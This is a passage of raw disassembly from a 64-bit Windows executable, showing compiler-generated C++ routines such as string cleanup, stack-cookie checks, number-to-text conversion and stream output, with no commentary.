   140003363:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003368:	e8 53 eb ff ff       	call   0x140001ec0
   14000336d:	90                   	nop
   14000336e:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140003373:	48 83 fa 0f          	cmp    $0xf,%rdx
   140003377:	76 34                	jbe    0x1400033ad
   140003379:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000337e:	48 ff c2             	inc    %rdx
   140003381:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003388:	72 1b                	jb     0x1400033a5
   14000338a:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   14000338e:	48 2b c1             	sub    %rcx,%rax
   140003391:	48 83 e8 08          	sub    $0x8,%rax
   140003395:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003399:	0f 87 dd 02 00 00    	ja     0x14000367c
   14000339f:	48 83 c2 27          	add    $0x27,%rdx
   1400033a3:	eb 03                	jmp    0x1400033a8
   1400033a5:	48 8b c8             	mov    %rax,%rcx
   1400033a8:	e8 67 51 00 00       	call   0x140008514
   1400033ad:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   1400033b1:	e8 6a ed ff ff       	call   0x140002120
   1400033b6:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400033b9:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   1400033be:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   1400033c3:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400033c8:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400033cd:	84 c0                	test   %al,%al
   1400033cf:	75 60                	jne    0x140003431
   1400033d1:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   1400033d7:	48 8d 15 9a 16 03 00 	lea    0x3169a(%rip),%rdx        # 0x140034a78
   1400033de:	e8 3d 22 00 00       	call   0x140005620
   1400033e3:	90                   	nop
   1400033e4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400033e9:	e8 d2 ea ff ff       	call   0x140001ec0
   1400033ee:	90                   	nop
   1400033ef:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400033f4:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400033f8:	0f 86 8e 02 00 00    	jbe    0x14000368c
   1400033fe:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140003403:	48 ff c2             	inc    %rdx
   140003406:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000340d:	0f 82 70 02 00 00    	jb     0x140003683
   140003413:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140003417:	48 2b c1             	sub    %rcx,%rax
   14000341a:	48 83 e8 08          	sub    $0x8,%rax
   14000341e:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003422:	0f 87 54 02 00 00    	ja     0x14000367c
   140003428:	48 83 c2 27          	add    $0x27,%rdx
   14000342c:	e9 55 02 00 00       	jmp    0x140003686
   140003431:	41 b8 13 00 00 00    	mov    $0x13,%r8d
   140003437:	48 8d 15 52 16 03 00 	lea    0x31652(%rip),%rdx        # 0x140034a90
   14000343e:	e8 dd 21 00 00       	call   0x140005620
   140003443:	90                   	nop
   140003444:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003449:	e8 72 ea ff ff       	call   0x140001ec0
   14000344e:	90                   	nop
   14000344f:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140003454:	48 83 fa 0f          	cmp    $0xf,%rdx
   140003458:	76 34                	jbe    0x14000348e
   14000345a:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000345f:	48 ff c2             	inc    %rdx
   140003462:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003469:	72 1b                	jb     0x140003486
   14000346b:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   14000346f:	48 2b c1             	sub    %rcx,%rax
   140003472:	48 83 e8 08          	sub    $0x8,%rax
   140003476:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000347a:	0f 87 fc 01 00 00    	ja     0x14000367c
   140003480:	48 83 c2 27          	add    $0x27,%rdx
   140003484:	eb 03                	jmp    0x140003489
   140003486:	48 8b c8             	mov    %rax,%rcx
   140003489:	e8 86 50 00 00       	call   0x140008514
   14000348e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003491:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140003496:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   14000349b:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   1400034a0:	41 b8 15 00 00 00    	mov    $0x15,%r8d
   1400034a6:	48 8d 15 fb 15 03 00 	lea    0x315fb(%rip),%rdx        # 0x140034aa8
   1400034ad:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400034b2:	e8 69 21 00 00       	call   0x140005620
   1400034b7:	90                   	nop
   1400034b8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400034bd:	e8 fe e9 ff ff       	call   0x140001ec0
   1400034c2:	90                   	nop
   1400034c3:	e9 27 ff ff ff       	jmp    0x1400033ef
   1400034c8:	4c 8d 4d 55          	lea    0x55(%rbp),%r9
   1400034cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400034d0:	49 ff c9             	dec    %r9
   1400034d3:	49 8b c7             	mov    %r15,%rax
   1400034d6:	49 f7 e0             	mul    %r8
   1400034d9:	48 c1 ea 03          	shr    $0x3,%rdx
   1400034dd:	0f b6 c2             	movzbl %dl,%eax
   1400034e0:	c0 e0 02             	shl    $0x2,%al
   1400034e3:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
   1400034e6:	02 c9                	add    %cl,%cl
   1400034e8:	44 2a c1             	sub    %cl,%r8b
   1400034eb:	41 80 c0 30          	add    $0x30,%r8b
   1400034ef:	45 88 01             	mov    %r8b,(%r9)
   1400034f2:	4c 8b c2             	mov    %rdx,%r8
   1400034f5:	48 85 d2             	test   %rdx,%rdx
   1400034f8:	75 d6                	jne    0x1400034d0
   1400034fa:	4c 8d 45 55          	lea    0x55(%rbp),%r8
   1400034fe:	49 8b d1             	mov    %r9,%rdx
   140003501:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140003505:	e8 76 1c 00 00       	call   0x140005180
   14000350a:	90                   	nop
   14000350b:	4c 8b 45 a0          	mov    -0x60(%rbp),%r8
   14000350f:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
   140003513:	48 8b c1             	mov    %rcx,%rax
   140003516:	49 2b c0             	sub    %r8,%rax
   140003519:	41 be 33 00 00 00    	mov    $0x33,%r14d
   14000351f:	48 8d 35 c2 14 03 00 	lea    0x314c2(%rip),%rsi        # 0x1400349e8
   140003526:	49 3b c6             	cmp    %r14,%rax
   140003529:	72 78                	jb     0x1400035a3
   14000352b:	49 8d 40 33          	lea    0x33(%r8),%rax
   14000352f:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   140003533:	48 8d 5d 90          	lea    -0x70(%rbp),%rbx
   140003537:	48 83 f9 0f          	cmp    $0xf,%rcx
   14000353b:	48 0f 47 5d 90       	cmova  -0x70(%rbp),%rbx
   140003540:	48 8d 05 d4 14 03 00 	lea    0x314d4(%rip),%rax        # 0x140034a1b
   140003547:	48 3b c3             	cmp    %rbx,%rax
   14000354a:	76 1b                	jbe    0x140003567
   14000354c:	4a 8d 04 03          	lea    (%rbx,%r8,1),%rax
   140003550:	48 3b f0             	cmp    %rax,%rsi
   140003553:	77 12                	ja     0x140003567
   140003555:	48 3b de             	cmp    %rsi,%rbx
   140003558:	77 05                	ja     0x14000355f
   14000355a:	49 8b fc             	mov    %r12,%rdi
   14000355d:	eb 0b                	jmp    0x14000356a
   14000355f:	48 8b fb             	mov    %rbx,%rdi
   140003562:	48 2b fe             	sub    %rsi,%rdi
   140003565:	eb 03                	jmp    0x14000356a
   140003567:	49 8b fe             	mov    %r14,%rdi
   14000356a:	49 ff c0             	inc    %r8
   14000356d:	48 8d 4b 33          	lea    0x33(%rbx),%rcx
   140003571:	48 8b d3             	mov    %rbx,%rdx
   140003574:	e8 c7 2c 02 00       	call   0x140026240
   140003579:	4c 8b c7             	mov    %rdi,%r8
   14000357c:	48 8b d6             	mov    %rsi,%rdx
   14000357f:	48 8b cb             	mov    %rbx,%rcx
   140003582:	e8 b9 2c 02 00       	call   0x140026240
   140003587:	4c 2b f7             	sub    %rdi,%r14
   14000358a:	48 8d 56 33          	lea    0x33(%rsi),%rdx
   14000358e:	48 03 d7             	add    %rdi,%rdx
   140003591:	48 8d 0c 3b          	lea    (%rbx,%rdi,1),%rcx
   140003595:	4d 8b c6             	mov    %r14,%r8
   140003598:	e8 a3 2c 02 00       	call   0x140026240
   14000359d:	48 8d 45 90          	lea    -0x70(%rbp),%rax
   1400035a1:	eb 16                	jmp    0x1400035b9
   1400035a3:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400035a8:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400035ad:	49 8b d6             	mov    %r14,%rdx
   1400035b0:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1400035b4:	e8 a7 32 00 00       	call   0x140006860
   1400035b9:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400035bc:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400035c1:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   1400035c6:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   1400035cb:	0f 10 00             	movups (%rax),%xmm0
   1400035ce:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400035d3:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400035d7:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   1400035dc:	4c 89 60 10          	mov    %r12,0x10(%rax)
   1400035e0:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   1400035e7:	00 
   1400035e8:	c6 00 00             	movb   $0x0,(%rax)
   1400035eb:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400035f0:	e8 cb e8 ff ff       	call   0x140001ec0
   1400035f5:	90                   	nop
   1400035f6:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400035fb:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400035ff:	76 37                	jbe    0x140003638
   140003601:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140003606:	48 ff c2             	inc    %rdx
   140003609:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003610:	72 1e                	jb     0x140003630
   140003612:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140003616:	48 2b c1             	sub    %rcx,%rax
   140003619:	48 83 e8 08          	sub    $0x8,%rax
   14000361d:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003621:	77 06                	ja     0x140003629
   140003623:	48 83 c2 27          	add    $0x27,%rdx
   140003627:	eb 0a                	jmp    0x140003633
   140003629:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000362e:	cd 29                	int    $0x29
   140003630:	48 8b c8             	mov    %rax,%rcx
   140003633:	e8 dc 4e 00 00       	call   0x140008514
   140003638:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   14000363d:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   140003644:	00 00 
   140003646:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   14000364b:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
   14000364f:	48 83 fa 0f          	cmp    $0xf,%rdx
   140003653:	76 37                	jbe    0x14000368c
   140003655:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   140003659:	48 ff c2             	inc    %rdx
   14000365c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003663:	72 1e                	jb     0x140003683
   140003665:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140003669:	48 2b c1             	sub    %rcx,%rax
   14000366c:	48 83 e8 08          	sub    $0x8,%rax
   140003670:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003674:	77 06                	ja     0x14000367c
   140003676:	48 83 c2 27          	add    $0x27,%rdx
   14000367a:	eb 0a                	jmp    0x140003686
   14000367c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003681:	cd 29                	int    $0x29
   140003683:	48 8b c8             	mov    %rax,%rcx
   140003686:	e8 89 4e 00 00       	call   0x140008514
   14000368b:	90                   	nop
   14000368c:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140003690:	48 85 c0             	test   %rax,%rax
   140003693:	74 42                	je     0x1400036d7
   140003695:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
   140003699:	48 2b d0             	sub    %rax,%rdx
   14000369c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400036a3:	72 1e                	jb     0x1400036c3
   1400036a5:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   1400036a9:	48 2b c1             	sub    %rcx,%rax
   1400036ac:	48 83 e8 08          	sub    $0x8,%rax
   1400036b0:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400036b4:	77 06                	ja     0x1400036bc
   1400036b6:	48 83 c2 27          	add    $0x27,%rdx
   1400036ba:	eb 0a                	jmp    0x1400036c6
   1400036bc:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400036c1:	cd 29                	int    $0x29
   1400036c3:	48 8b c8             	mov    %rax,%rcx
   1400036c6:	e8 49 4e 00 00       	call   0x140008514
   1400036cb:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400036ce:	f3 0f 7f 45 b8       	movdqu %xmm0,-0x48(%rbp)
   1400036d3:	4c 89 65 c8          	mov    %r12,-0x38(%rbp)
   1400036d7:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   1400036db:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400036df:	76 37                	jbe    0x140003718
   1400036e1:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400036e5:	48 ff c2             	inc    %rdx
   1400036e8:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400036ef:	72 1e                	jb     0x14000370f
   1400036f1:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   1400036f5:	48 2b c1             	sub    %rcx,%rax
   1400036f8:	48 83 e8 08          	sub    $0x8,%rax
   1400036fc:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003700:	77 06                	ja     0x140003708
   140003702:	48 83 c2 27          	add    $0x27,%rdx
   140003706:	eb 0a                	jmp    0x140003712
   140003708:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000370d:	cd 29                	int    $0x29
   14000370f:	48 8b c8             	mov    %rax,%rcx
   140003712:	e8 fd 4d 00 00       	call   0x140008514
   140003717:	90                   	nop
   140003718:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000371c:	48 85 c0             	test   %rax,%rax
   14000371f:	74 42                	je     0x140003763
   140003721:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140003725:	48 2b d0             	sub    %rax,%rdx
   140003728:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000372f:	72 1e                	jb     0x14000374f
   140003731:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140003735:	48 2b c1             	sub    %rcx,%rax
   140003738:	48 83 e8 08          	sub    $0x8,%rax
   14000373c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003740:	77 06                	ja     0x140003748
   140003742:	48 83 c2 27          	add    $0x27,%rdx
   140003746:	eb 0a                	jmp    0x140003752
   140003748:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000374d:	cd 29                	int    $0x29
   14000374f:	48 8b c8             	mov    %rax,%rcx
   140003752:	e8 bd 4d 00 00       	call   0x140008514
   140003757:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000375a:	f3 0f 7f 45 e0       	movdqu %xmm0,-0x20(%rbp)
   14000375f:	4c 89 65 f0          	mov    %r12,-0x10(%rbp)
   140003763:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140003767:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000376b:	76 36                	jbe    0x1400037a3
   14000376d:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140003771:	48 ff c2             	inc    %rdx
   140003774:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000377b:	72 1e                	jb     0x14000379b
   14000377d:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140003781:	48 2b c1             	sub    %rcx,%rax
   140003784:	48 83 e8 08          	sub    $0x8,%rax
   140003788:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000378c:	77 06                	ja     0x140003794
   14000378e:	48 83 c2 27          	add    $0x27,%rdx
   140003792:	eb 0a                	jmp    0x14000379e
   140003794:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003799:	cd 29                	int    $0x29
   14000379b:	48 8b c8             	mov    %rax,%rcx
   14000379e:	e8 71 4d 00 00       	call   0x140008514
   1400037a3:	33 c0                	xor    %eax,%eax
   1400037a5:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   1400037ac:	48 33 cc             	xor    %rsp,%rcx
   1400037af:	e8 fc 4c 00 00       	call   0x1400084b0
   1400037b4:	48 81 c4 80 02 00 00 	add    $0x280,%rsp
   1400037bb:	41 5f                	pop    %r15
   1400037bd:	41 5e                	pop    %r14
   1400037bf:	41 5c                	pop    %r12
   1400037c1:	5f                   	pop    %rdi
   1400037c2:	5e                   	pop    %rsi
   1400037c3:	5b                   	pop    %rbx
   1400037c4:	5d                   	pop    %rbp
   1400037c5:	c3                   	ret
   1400037c6:	e8 f5 db ff ff       	call   0x1400013c0
   1400037cb:	90                   	nop
   1400037cc:	e8 9f d9 ff ff       	call   0x140001170
   1400037d1:	cc                   	int3
   1400037d2:	cc                   	int3
   1400037d3:	cc                   	int3
   1400037d4:	cc                   	int3
   1400037d5:	cc                   	int3
   1400037d6:	cc                   	int3
   1400037d7:	cc                   	int3
   1400037d8:	cc                   	int3
   1400037d9:	cc                   	int3
   1400037da:	cc                   	int3
   1400037db:	cc                   	int3
   1400037dc:	cc                   	int3
   1400037dd:	cc                   	int3
   1400037de:	cc                   	int3
   1400037df:	cc                   	int3
   1400037e0:	40 53                	rex push %rbx
   1400037e2:	55                   	push   %rbp
   1400037e3:	56                   	push   %rsi
   1400037e4:	57                   	push   %rdi
   1400037e5:	48 83 ec 48          	sub    $0x48,%rsp
   1400037e9:	48 8b 05 90 68 03 00 	mov    0x36890(%rip),%rax        # 0x14003a080
   1400037f0:	48 33 c4             	xor    %rsp,%rax
   1400037f3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400037f8:	48 8b e9             	mov    %rcx,%rbp
   1400037fb:	33 d2                	xor    %edx,%edx
   1400037fd:	48 8d 4c 24 2c       	lea    0x2c(%rsp),%rcx
   140003802:	e8 81 3f 00 00       	call   0x140007788
   140003807:	90                   	nop
   140003808:	48 8b 1d c9 8a 03 00 	mov    0x38ac9(%rip),%rbx        # 0x14003c2d8
   14000380f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003814:	48 8b 3d 5d 7c 03 00 	mov    0x37c5d(%rip),%rdi        # 0x14003b478
   14000381b:	48 85 ff             	test   %rdi,%rdi
   14000381e:	75 3d                	jne    0x14000385d
   140003820:	33 d2                	xor    %edx,%edx
   140003822:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140003827:	e8 5c 3f 00 00       	call   0x140007788
   14000382c:	48 39 3d 45 7c 03 00 	cmp    %rdi,0x37c45(%rip)        # 0x14003b478
   140003833:	75 17                	jne    0x14000384c
   140003835:	8b 05 25 7c 03 00    	mov    0x37c25(%rip),%eax        # 0x14003b460
   14000383b:	ff c0                	inc    %eax
   14000383d:	89 05 1d 7c 03 00    	mov    %eax,0x37c1d(%rip)        # 0x14003b460
   140003843:	48 98                	cltq
   140003845:	48 89 05 2c 7c 03 00 	mov    %rax,0x37c2c(%rip)        # 0x14003b478
   14000384c:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140003851:	e8 aa 3f 00 00       	call   0x140007800
   140003856:	48 8b 3d 1b 7c 03 00 	mov    0x37c1b(%rip),%rdi        # 0x14003b478
   14000385d:	48 8b 55 08          	mov    0x8(%rbp),%rdx
   140003861:	48 8d 34 fd 00 00 00 	lea    0x0(,%rdi,8),%rsi
   140003868:	00 
   140003869:	48 3b 7a 18          	cmp    0x18(%rdx),%rdi
   14000386d:	73 33                	jae    0x1400038a2
   14000386f:	48 8b 42 10          	mov    0x10(%rdx),%rax
   140003873:	48 8b 0c 06          	mov    (%rsi,%rax,1),%rcx
   140003877:	48 85 c9             	test   %rcx,%rcx
   14000387a:	74 28                	je     0x1400038a4
   14000387c:	48 8b d9             	mov    %rcx,%rbx
   14000387f:	48 8d 4c 24 2c       	lea    0x2c(%rsp),%rcx
   140003884:	e8 77 3f 00 00       	call   0x140007800
   140003889:	48 8b c3             	mov    %rbx,%rax
   14000388c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003891:	48 33 cc             	xor    %rsp,%rcx
   140003894:	e8 17 4c 00 00       	call   0x1400084b0
   140003899:	48 83 c4 48          	add    $0x48,%rsp
   14000389d:	5f                   	pop    %rdi
   14000389e:	5e                   	pop    %rsi
   14000389f:	5d                   	pop    %rbp
   1400038a0:	5b                   	pop    %rbx
   1400038a1:	c3                   	ret
   1400038a2:	33 c9                	xor    %ecx,%ecx
   1400038a4:	80 7a 24 00          	cmpb   $0x0,0x24(%rdx)
   1400038a8:	74 13                	je     0x1400038bd
   1400038aa:	e8 a5 40 00 00       	call   0x140007954
   1400038af:	48 3b 78 18          	cmp    0x18(%rax),%rdi
   1400038b3:	73 0d                	jae    0x1400038c2
   1400038b5:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400038b9:	48 8b 0c 06          	mov    (%rsi,%rax,1),%rcx
   1400038bd:	48 85 c9             	test   %rcx,%rcx
   1400038c0:	75 ba                	jne    0x14000387c
   1400038c2:	48 85 db             	test   %rbx,%rbx
   1400038c5:	75 b8                	jne    0x14000387f
   1400038c7:	48 8b d5             	mov    %rbp,%rdx
   1400038ca:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400038cf:	e8 6c e1 ff ff       	call   0x140001a40
   1400038d4:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400038d8:	74 24                	je     0x1400038fe
   1400038da:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1400038df:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400038e4:	48 8b cb             	mov    %rbx,%rcx
   1400038e7:	e8 2c 40 00 00       	call   0x140007918
   1400038ec:	48 8b 03             	mov    (%rbx),%rax
   1400038ef:	48 8b cb             	mov    %rbx,%rcx
   1400038f2:	ff 50 08             	call   *0x8(%rax)
   1400038f5:	48 89 1d dc 89 03 00 	mov    %rbx,0x389dc(%rip)        # 0x14003c2d8
   1400038fc:	eb 81                	jmp    0x14000387f
   1400038fe:	e8 4d e0 ff ff       	call   0x140001950
   140003903:	cc                   	int3
   140003904:	cc                   	int3
   140003905:	cc                   	int3
   140003906:	cc                   	int3
   140003907:	cc                   	int3
   140003908:	cc                   	int3
   140003909:	cc                   	int3
   14000390a:	cc                   	int3
   14000390b:	cc                   	int3
   14000390c:	cc                   	int3
   14000390d:	cc                   	int3
   14000390e:	cc                   	int3
   14000390f:	cc                   	int3
   140003910:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003915:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000391a:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000391f:	57                   	push   %rdi
   140003920:	41 54                	push   %r12
   140003922:	41 55                	push   %r13
   140003924:	41 56                	push   %r14
   140003926:	41 57                	push   %r15
   140003928:	48 83 ec 70          	sub    $0x70,%rsp
   14000392c:	4c 8b e2             	mov    %rdx,%r12
   14000392f:	48 8b f1             	mov    %rcx,%rsi
   140003932:	45 33 ed             	xor    %r13d,%r13d
   140003935:	41 8b fd             	mov    %r13d,%edi
   140003938:	44 89 ac 24 b0 00 00 	mov    %r13d,0xb0(%rsp)
   14000393f:	00 
   140003940:	48 8b ca             	mov    %rdx,%rcx
   140003943:	e8 c8 34 02 00       	call   0x140026e10
   140003948:	4c 8b f0             	mov    %rax,%r14
   14000394b:	4c 8b 06             	mov    (%rsi),%r8
   14000394e:	4d 63 48 04          	movslq 0x4(%r8),%r9
   140003952:	49 8b 5c 31 28       	mov    0x28(%r9,%rsi,1),%rbx
   140003957:	48 85 db             	test   %rbx,%rbx
   14000395a:	7e 0a                	jle    0x140003966
   14000395c:	48 3b d8             	cmp    %rax,%rbx
   14000395f:	7e 05                	jle    0x140003966
   140003961:	48 2b d8             	sub    %rax,%rbx
   140003964:	eb 03                	jmp    0x140003969
   140003966:	49 8b dd             	mov    %r13,%rbx
   140003969:	4c 8b fe             	mov    %rsi,%r15
   14000396c:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003971:	49 8b 4c 31 48       	mov    0x48(%r9,%rsi,1),%rcx
   140003976:	48 85 c9             	test   %rcx,%rcx
   140003979:	74 07                	je     0x140003982
   14000397b:	48 8b 01             	mov    (%rcx),%rax
   14000397e:	ff 50 08             	call   *0x8(%rax)
   140003981:	90                   	nop
   140003982:	48 8b 0e             	mov    (%rsi),%rcx
   140003985:	48 63 41 04          	movslq 0x4(%rcx),%rax
   140003989:	83 7c 30 10 00       	cmpl   $0x0,0x10(%rax,%rsi,1)
   14000398e:	74 09                	je     0x140003999
   140003990:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   140003995:	32 c0                	xor    %al,%al
   140003997:	eb 33                	jmp    0x1400039cc
   140003999:	48 8b 44 30 50       	mov    0x50(%rax,%rsi,1),%rax
   14000399e:	48 85 c0             	test   %rax,%rax
   1400039a1:	74 22                	je     0x1400039c5
   1400039a3:	48 3b c6             	cmp    %rsi,%rax
   1400039a6:	74 1d                	je     0x1400039c5
   1400039a8:	48 8b c8             	mov    %rax,%rcx
   1400039ab:	e8 c0 24 00 00       	call   0x140005e70
   1400039b0:	48 8b 0e             	mov    (%rsi),%rcx
   1400039b3:	48 63 41 04          	movslq 0x4(%rcx),%rax
   1400039b7:	83 7c 30 10 00       	cmpl   $0x0,0x10(%rax,%rsi,1)
   1400039bc:	0f 94 c0             	sete   %al
   1400039bf:	88 44 24 28          	mov    %al,0x28(%rsp)
   1400039c3:	eb 07                	jmp    0x1400039cc
   1400039c5:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   1400039ca:	b0 01                	mov    $0x1,%al
   1400039cc:	84 c0                	test   %al,%al
   1400039ce:	75 0c                	jne    0x1400039dc
   1400039d0:	ba 04 00 00 00       	mov    $0x4,%edx
   1400039d5:	8b fa                	mov    %edx,%edi
   1400039d7:	e9 4e 01 00 00       	jmp    0x140003b2a
   1400039dc:	48 63 41 04          	movslq 0x4(%rcx),%rax
   1400039e0:	8b 4c 30 18          	mov    0x18(%rax,%rsi,1),%ecx
   1400039e4:	81 e1 c0 01 00 00    	and    $0x1c0,%ecx
   1400039ea:	83 f9 40             	cmp    $0x40,%ecx
   1400039ed:	74 6f                	je     0x140003a5e
   1400039ef:	90                   	nop
   1400039f0:	48 85 db             	test   %rbx,%rbx
   1400039f3:	7e 69                	jle    0x140003a5e
   1400039f5:	48 8b 06             	mov    (%rsi),%rax
   1400039f8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400039fc:	4c 8b 44 31 48       	mov    0x48(%rcx,%rsi,1),%r8
   140003a01:	44 0f b6 4c 31 58    	movzbl 0x58(%rcx,%rsi,1),%r9d
   140003a07:	49 8b 40 40          	mov    0x40(%r8),%rax
   140003a0b:	48 83 38 00          	cmpq   $0x0,(%rax)
   140003a0f:	74 24                	je     0x140003a35
   140003a11:	49 8b 48 58          	mov    0x58(%r8),%rcx
   140003a15:	8b 01                	mov    (%rcx),%eax
   140003a17:	85 c0                	test   %eax,%eax
   140003a19:	7e 1a                	jle    0x140003a35
   140003a1b:	ff c8                	dec    %eax
   140003a1d:	89 01                	mov    %eax,(%rcx)
   140003a1f:	49 8b 48 40          	mov    0x40(%r8),%rcx
   140003a23:	48 8b 11             	mov    (%rcx),%rdx
   140003a26:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140003a2a:	48 89 01             	mov    %rax,(%rcx)
   140003a2d:	44 88 0a             	mov    %r9b,(%rdx)
   140003a30:	41 8b c1             	mov    %r9d,%eax
   140003a33:	eb 0c                	jmp    0x140003a41
   140003a35:	41 8b d1             	mov    %r9d,%edx
   140003a38:	49 8b 00             	mov    (%r8),%rax
   140003a3b:	49 8b c8             	mov    %r8,%rcx
   140003a3e:	ff 50 18             	call   *0x18(%rax)
   140003a41:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003a44:	75 13                	jne    0x140003a59
   140003a46:	ba 04 00 00 00       	mov    $0x4,%edx
   140003a4b:	8b fa                	mov    %edx,%edi
   140003a4d:	89 94 24 b0 00 00 00 	mov    %edx,0xb0(%rsp)
   140003a54:	e9 a7 00 00 00       	jmp    0x140003b00
   140003a59:	48 ff cb             	dec    %rbx
   140003a5c:	eb 92                	jmp    0x1400039f0
   140003a5e:	48 8b 06             	mov    (%rsi),%rax
   140003a61:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003a65:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   140003a6a:	48 8b 01             	mov    (%rcx),%rax
   140003a6d:	4d 8b c6             	mov    %r14,%r8
   140003a70:	49 8b d4             	mov    %r12,%rdx
   140003a73:	ff 50 48             	call   *0x48(%rax)
   140003a76:	49 3b c6             	cmp    %r14,%rax
